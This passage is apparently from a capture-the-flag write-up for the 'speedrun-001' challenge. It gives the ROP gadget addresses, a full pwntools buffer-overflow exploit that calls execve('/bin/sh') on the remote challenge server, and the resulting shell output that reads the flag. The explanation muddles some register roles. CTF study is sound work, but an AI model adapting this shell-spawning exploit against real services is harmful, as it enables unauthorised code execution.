essential gadgets needed for the execve syscall ROP:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">pop_rax_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0000000000415664\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">pop_rdi_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0000000000400686\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">pop_rdx_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">00000000004498b5\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">pop_rsi_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">00000000004101f3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We also collect write and syscall gadgets\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">write_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">000000000048d251\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">syscall \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> 0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">000000000040129c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The reason we collect the \u003Ccode>rax\u003C/code>, \u003Ccode>rdi\u003C/code>, \u003Ccode>rdx\u003C/code>, and \u003Ccode>rsi\u003C/code> gadgets is because \u003Ccode>rax\u003C/code> sets the syscall number of execve, \u003Ccode>rdi\u003C/code> sets the string ‘/bin/sh’, \u003Ccode>rdi\u003C/code> ensures 0 arguments, and \u003Ccode>rsi\u003C/code> ensures no environmental variables.\u003C/p>\n\u003Cp>We collect the write gadget because we need to ensure we can send \u003Ccode>/bin/sh\u003C/code> and so we write from rdx to rax.\u003C/p>\n\u003Cp>We then do basic assembly to intialize the execve syscall and then execute.\u003C/p>\n\u003Cp>Full exploit code here:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pwn \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">from\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pwn \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">import\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> p64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">elf \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> ELF\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">./speedrun-001\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> args\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#82AAFF\">REMOTE\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    r \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> remote\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">35.164.239.133\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 31337\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    r \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> process\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">elf.path\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">amount \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1024\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">payload \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">A\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> *\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (amount \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 8\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">prepare ROP chain to go to /bin/sh\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">prepare gadgets\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">pop_rax_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0000000000415664\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">pop_rdi_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0000000000400686\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">pop_rdx_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">00000000004498b5\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">pop_rsi_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">00000000004101f3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">prepare the write and syscall gadget (mov qword ptr [rax], rdx ; ret)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">write_gadget \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">000000000048d251\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">syscall \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">000000000040129c\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">/bin/sh\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pop_rdx_gadget\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> b\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">/bin/sh\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\x00\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pop_rax_gadget\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">6b6000\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> write_gadget\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">prepare four registers with arguments and make syscall\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pop_rax_gadget\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">3b\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pop_rdi_gadget\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">6b6000\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pop_rsi_gadget\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> pop_rdx_gadget\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> p64\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">0x\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">rop \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> syscall\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">payload \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> rop\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">r\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">sendline\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">payload\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">r\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">interactive\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We get the flag!\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[+] Opening connection to 52.37.0.17 on port 31337: Done\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">] Switching to interactive mode\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Hello\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> brave\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> new\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> challenger\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">Any\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> last\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> words?\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">This\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> will\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> be\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> the\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> last\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> thing\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> that\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> you\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> say:\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#F78C6C\">\\x\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">b5\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#F78C6C\">\\x\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">98D\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">$\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> cat\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> /flag\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">OOO\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\">{Ask\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> any\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> pwner.\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> Any\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> real\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> pwner.\u003C/span>\u003Cspan style=\"color:#2B5581;--shiki-dark:#ECC48D\"> It\u003C/span>\u003Cspan 